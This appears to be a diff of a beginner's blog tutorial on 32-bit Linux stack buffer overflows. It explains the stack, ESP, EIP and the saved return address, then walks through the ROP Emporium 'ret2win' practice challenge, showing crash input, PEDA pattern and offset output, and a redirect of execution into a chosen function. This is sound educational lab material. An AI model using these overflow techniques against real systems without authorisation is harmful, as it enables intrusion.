@@ -10,19 +10,22 @@ image:
   creditlink:
 ---
 
-NOTE: THIS IS STILL A WIP
-
 Introduction
 ------------
 Buffer overflow's are probably my favourite part of the security field. They can range from simple to incomprehensible, offer a wide variety of exploitation techniques and are just kinda fun.  Also they sound way more difficult than they are, so I've been enjoying riding on that cred round the office for the last couple months. 
 
-Whilst modern OS's have started to introduce memory protections, there are always ways around these, and it's still up to the application developers to protect their applications. Have a quick search on [exploit-db](https://www.exploit-db.com) for recent buffer overflow exploits, and you'll get a fair few turn up.  To be honest, you'll probably never use any of the techniques described here to get your own zero-day.  If only I hadn't been in nappies around 1995, when this stuff was 'cutting edge'.
+Whilst modern OS's have started to introduce memory protections, there are always ways around these, and it's still up to the application developers to protect their applications. Have a quick search on [exploit-db](https://www.exploit-db.com) for recent buffer overflow exploits, and you'll get a fair few turn up.  To be honest, you'll probably never use any of the techniques described here to get your own zero-day.  With techniques to prevent memory exploitation such as [Data Execution Prevention](https://en.wikipedia.org/wiki/Executable_space_protection) and [Address Space Layout Randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization), these techniques, while fundamental to learn, will not work in most modern systems.  If only I hadn't been in nappies when this stuff was 'cutting edge'.
 
 The goal of this series is to go over the most basic of buffer overflow's affecting the linux platform in an approachable manner, not shying too far from the lower level details.  Hopefully, I can help someone learn something from this.  If you have suggestions for me to improve my approach, don't hesitate to drop me a message or leave a comment, and equally if you have any questions.
 
-The definitive article on buffer overflow's is [http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf](Smashing the stack for fun and profit) by Aleph One, and it wouldn't be right not to mention it in my opinion.  I'll also include at the end some of the resources I've used to shore up my understanding. 
+The definitive article on buffer overflow's is [Smashing the stack for fun and profit](http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf) by Aleph One, and it wouldn't be right not to mention it in my opinion.  I'll also include at the end some of the resources I've used to shore up my understanding. 
 
 So lets jump right in and smash the stack! 
+
+Environment
+-----------
+* [Kali 2017.2](https://www.kali.org/news/kali-linux-2017-2-release/)
+* [GDB Peda](https://github.com/longld/peda)
 
 Example 1 - Stack buffer overflow basic 1
 -----------------------------------------
@@ -64,7 +67,7 @@ The actual exploitation of this is fairly trivial.  The fgets function allows us
 
 So what exactly is the stack?  Well, it's really just a section of memory that we define as being used to store several important variables and locals with fixed size.  Whenever I refer to the stack, just note that it's a defined block of memory where my variables defined above, like `check` and `buf` are stored.  This makes it simple for the compiler to manage variables and code, as well as allow us to do some fancy tricks if programmers get lazy.  The stack can grow and shrink as execution takes place, but this example will keep it simple. 
 
-Let's open this in gdb and run a disassembly of the main function.  There are better tools for doing this such as [radare2](https://github.com/radare/radare2), but we'll keep it simple for now.
+Let's open this in gdb and run a disassembly of the main function.  There are better tools for doing this but we'll keep it simple for now.
 ```gdb
 gdb$ disas main
 Dump of assembler code for function main:
@@ -209,9 +212,9 @@ The stack
 <img src='/assets/img/stack-bof-1/stack-1.png'>
  </p>
 
-So I've mentioned the stack a lot, but how do we know where it's located and how does it relate to `$esp` which we kept referring to?  The diagram above illustrates generally how it looks in memory.  Of course some details are missing but it does show the basics.
+So I've mentioned the stack a lot, but how do we know where it's located and how does it relate to `$esp` which we kept referring to?  The diagram above illustrates generally how it looks in memory.  Of course a lot of details are missing but it does show the basics.
 
-We define where the top of the stack is located in memory at any specific time with the `$esp` register.  It defines the location of the top of the stack, and is manipulated with individual `push` and `pop` instructions, which as their names might indicate, either add or remove from the stack.  If we push to the stack, the value of `$esp` is decremented, and vice versa for popping from it.  
+We define where the top of the stack is located in memory at any specific time with the `$esp` register.  It defines the location of the top of the stack, and is manipulated with individual `push` and `pop` instructions, which as their names might indicate, either add or remove from the stack.  The stack itself will grow downwards in memory for x86 architectures.  Therefore, if we push to the stack a value, that value is written to the location at `$esp` and the value of `$esp` is decremented, and incremented for popping from it.  The diagram below illustrates what happens to ESP as we push and pop.
 
 <p align="center">
 <img src='/assets/img/stack-bof-1/stack-2.png'>
@@ -223,6 +226,8 @@ The third register we will refer to is `$eip`.  In simple terms it just stores t
 
 At `$ebp+4` the return address of the stack frame is stored.  What is this and why is it important?
 
+The Return Address
+------------------
 When a stack frame is left, such as in a function exit, generally the `leave` instruction is called.  This clears up the stack frame by moving the stack pointer to the frame pointer, in effect popping the stack up to the frame pointer.  No data is actually deleted but from the point-of-view of the stack, it no longer exists unless we go manually adjusting `$esp`.
 
 ```asm
@@ -245,14 +250,21 @@ If you're interested in a more detailed exploration of how the stack works, Gust
 Hopefully, now we can see how we can hijack command of a program's execution rather than just overwriting variables, with this technique.  If we can overwrite enough past our buffer, we can overwrite the saved return address.  Once a `ret` is called, the address we've overwritten will be jumped to.  So how do we use this?
 
 Example 2 - ret2win
----------
+-----------------
 We'll be using the first binary challenge on [ropemporium](https://ropemporium.com/challenge/ret2win.html), called ret2win for this.  For this we're going to be hijacking execution of the program.
 
-When an unreachable address is jumped to for execution, the program will exit in a segmentation fault.  If we want to execute an arbitrary command, all we have to do is force a segmentation fault to prove that we've overwritten the saved return address.  So lets load up the binary and do that.
-
-Note: Still a WIP
+When an unreachable address is jumped to for execution, the program will exit in a segmentation fault.  If we want to execute an arbitrary command, all we have to do is force a segmentation fault to prove that we've overwritten the saved return address.  So lets load up the binary and input some text.
 
 ```bash
+root@kali:~/Downloads# python -c 'print "A"*200' | ./ret2win32
+ret2win by ROP Emporium
+32bits
+
+For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
+What could possibly go wrong?
+You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!
+
+> Segmentation fault
 ```
 
 Boom!  We got a segmentation fault, but it doesn't give us much of a clue how many bytes we'll need to overwrite.  We can either modify the amount we overwrite byte by byte, or use a cyclic sequence to read off the location of EIP.  Metasploit has it's `pattern_create.rb` and [PEDA](https://github.com/longld/peda) has it's own `pattern create`.
@@ -260,11 +272,45 @@ Boom!  We got a segmentation fault, but it doesn't give us much of a clue how ma
 We'll create a buffer of length 200, and see the value that `$eip` segfaults on.
 
 ```gdb
+gdb-peda$ pattern create 200
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
+gdb-peda$ r
+Starting program: /root/Downloads/ret2win32 
+ret2win by ROP Emporium
+32bits
+
+For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;
+What could possibly go wrong?
+You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!
+
+> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
+
+Program received signal SIGSEGV, Segmentation fault.
 ```
 
-Since the program segfaults at 0x41414641, we use `pattern offset 0x41414641` in PEDA.
+The program will then print out it's registers, but the one of most importance is the EIP register.
+```bash
+EAX: 0xffffd290 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
+EBX: 0x0 
+ECX: 0xf7faf87c --> 0x0 
+EDX: 0xffffd290 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAb")
+ESI: 0x1 
+EDI: 0xf7fae000 --> 0x1b2db0 
+EBP: 0x41304141 ('AA0A')
+ESP: 0xffffd2c0 --> 0xf7fa0062 --> 0xe0a5210 
+EIP: 0x41414641 ('AFAA')
+```
 
-So we know from the description that we want to return into the ret2win function.  We'll have a quick look at the disassembly of this function to see what it's doing.  I'm using radare2 for this:
+Here we see it has a value of 0x41414641.  What's happened in execution is we've overwritten the saved EIP, and then the program has attempted to return back to that location in memory.  Since there's nothing there, it's thrown a segmentation fault.  we use `pattern offset 0x41414641` in PEDA, which tells us at what position that value was in our string.
+
+```
+gdb-peda$ pattern offset 0x41414641
+1094796865 found at offset: 44
+```
+
+Here we see it's at position 44.  So we want to write 44 bytes, and then write our return address into our input.
+
+So we know from the description that we want to return into the ret2win function.  We'll have a quick look at the disassembly of this function to see what it's doing.
 
 ```gdb
 ;-- ret2win:
@@ -297,7 +343,7 @@ You there madam, may I have your input please? And don't worry about null bytes,
 Segmentation fault 
 ```
 
-So with this we've succesfully redirected execution into a function of our choice. We did get a segmentation fault at the end, but this is avoidable if required.  For now, we don't need to worry about that.
+So with this we've succesfully redirected execution into a function of our choice. We did get a segmentation fault at the end, but this is avoidable if required, as we didn't control execution once our `ret2win` function had exited.  For now, we won't worry about that.
 
 Custom code execution
 --------------------
